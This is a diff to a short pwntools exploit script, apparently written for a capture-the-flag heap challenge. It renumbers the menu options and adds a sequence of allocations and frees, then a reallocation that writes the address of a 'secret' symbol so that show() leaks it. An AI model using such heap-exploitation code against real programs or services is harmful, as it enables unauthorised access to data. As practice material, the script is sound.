@@ -56,10 +56,10 @@ def dbg():
 	gdb.attach(p)
 	pause()
 
-_add,_free,_edit,_show = 1,4,2,3
-def add(index,content='a'*8):
+_add,_free,_edit,_show = 1,2,4,3
+def add(size,content='a'*8):
 	sla(':',_add)
-	sla(':',index)
+	sla(':',size)
 	sa(':',content)
 
 def free(index):
@@ -76,7 +76,13 @@ def show(index):
 	sla(':',index)
 
 # start
+add(0x20)
+add(0x20)
+free(0)
+free(1)
 
+add(0x8,p32(elf.sym['secret']))
+show(0)
 # end
 
 p.interactive()
